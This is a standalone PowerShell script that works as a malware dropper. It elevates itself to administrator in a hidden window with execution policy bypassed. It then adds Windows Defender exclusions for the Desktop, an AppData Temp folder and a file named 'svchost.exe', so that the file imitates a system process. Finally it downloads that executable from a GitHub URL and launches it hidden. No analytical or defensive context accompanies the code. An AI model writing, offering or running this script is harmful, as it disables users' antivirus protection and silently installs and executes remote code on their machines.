function Run-AsAdmin {
    param([string]$scriptPath)

    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        $psi.Verb = "runas"
        try {
            [Diagnostics.Process]::Start($psi) | Out-Null
            exit
        }
        catch {
            Write-Error "Elevation cancelled or failed."
            exit 1
        }
    }
}

$scriptPath = $MyInvocation.MyCommand.Definition
Run-AsAdmin -scriptPath $scriptPath

$exeUrl = "https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe"
$desktopPath = [Environment]::GetFolderPath("Desktop")
$destination = Join-Path -Path $desktopPath -ChildPath "svchost.exe"

$roamingTempPath = Join-Path -Path $env:APPDATA -ChildPath "Temp"
$roamingTempSvchostExe = Join-Path -Path $roamingTempPath -ChildPath "svchost.exe"

if (-not (Test-Path $roamingTempPath)) {
    New-Item -ItemType Directory -Force -Path $roamingTempPath | Out-Null
}

Add-MpPreference -ExclusionPath $roamingTempPath
Add-MpPreference -ExclusionPath $roamingTempSvchostExe
Add-MpPreference -ExclusionPath $desktopPath
Add-MpPreference -ExclusionPath $destination

# Get the device path
$devicePath = (Get-Volume).DevicePath | Where-Object { $_ -like "*HarddiskVolume3*" }

# Add AMSI exception
$exclusionPath = Join-Path -Path $devicePath -ChildPath "Users\$env:USERNAME\Desktop\svchost.exe"
Add-MpPreference -ExclusionPath $exclusionPath

Invoke-WebRequest -Uri $exeUrl -OutFile $destination

Start-Process -FilePath $destination -WindowStyle Hidden
